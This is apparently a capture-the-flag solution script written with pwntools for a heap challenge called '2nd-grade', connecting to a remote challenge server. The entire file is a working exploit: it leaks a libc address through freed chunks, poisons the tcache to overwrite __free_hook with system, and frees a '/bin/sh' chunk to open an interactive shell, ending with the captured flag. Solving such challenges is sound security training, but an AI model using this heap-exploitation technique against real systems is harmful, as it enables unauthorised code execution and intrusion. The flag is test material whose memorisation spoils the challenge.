from pwn import *

context.terminal = ["kitty"]
script = """
c
"""

libc = ELF("./libc.so.6")

if args.GDB:
    p = gdb.debug("./2nd-grade", gdbscript=script)
elif args.REMOTE:
    p = remote("0.cloud.chals.io", 34164)
else:
    p = process("./2nd-grade")

def make(index):
    p.sendlineafter(b":\n", b"1")
    p.sendlineafter(b"? ", str(index).encode())

def free(index):
    p.sendlineafter(b":\n", b"3")
    p.sendlineafter(b"? ", str(index).encode())

def edit(index, data):
    p.sendlineafter(b":\n", b"2")
    p.sendlineafter(b"? ", str(index).encode())
    p.sendlineafter(b"? ", data)

def view(index):
    p.sendlineafter(b":\n", b"4")
    p.sendlineafter(b"? \n", str(index).encode())
    return p.recvline().strip()

for i in range(11):
    make(i)
for i in range(2, 10):
    free(i)

leak = u64(view(9).ljust(8, b"\x00"))
base = leak - 0x3aeca0
log.info(f"leak: 0x{leak:x}")
log.info(f"base: 0x{base:x}")

edit(8, p64(base + libc.sym.__free_hook))

make(0)
make(1)

edit(0, b"/bin/sh\x00")
edit(1, p64(base + libc.sym.system))

free(0)

p.interactive()

# UDCTF{w4lk_th4t_l1ne_johnny_boi}